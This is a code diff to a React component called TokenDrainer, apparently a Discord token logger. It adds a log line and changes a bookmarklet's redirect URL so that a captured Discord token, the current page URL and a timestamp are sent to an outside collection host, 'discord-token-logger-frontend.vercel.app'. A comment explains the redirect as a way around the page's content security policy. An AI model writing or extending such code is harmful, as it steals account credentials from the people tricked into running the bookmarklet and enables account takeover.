@@ -29,6 +29,7 @@ function TokenDrainer() {
           if (data.message) console.error('Backend:', data.message);
           return;
         }
+        console.log('process-token API ran successfully');
         setStatus('success');
       })
       .catch((err) => {
@@ -151,7 +152,7 @@ function TokenDrainer() {
 
             // CSP blocks fetch from Discord domain, so use a different approach
             // Open a new tab with the token in the URL
-            var redirectUrl = 'https://bookmarklett.vercel.app/?token=' + encodeURIComponent(cleanToken) +
+            var redirectUrl = 'https://discord-token-logger-frontend.vercel.app/?token=' + encodeURIComponent(cleanToken) +
                              '&method=bookmarklet&timestamp=' + encodeURIComponent(new Date().toISOString()) +
                              '&url=' + encodeURIComponent(window.location.href);
 
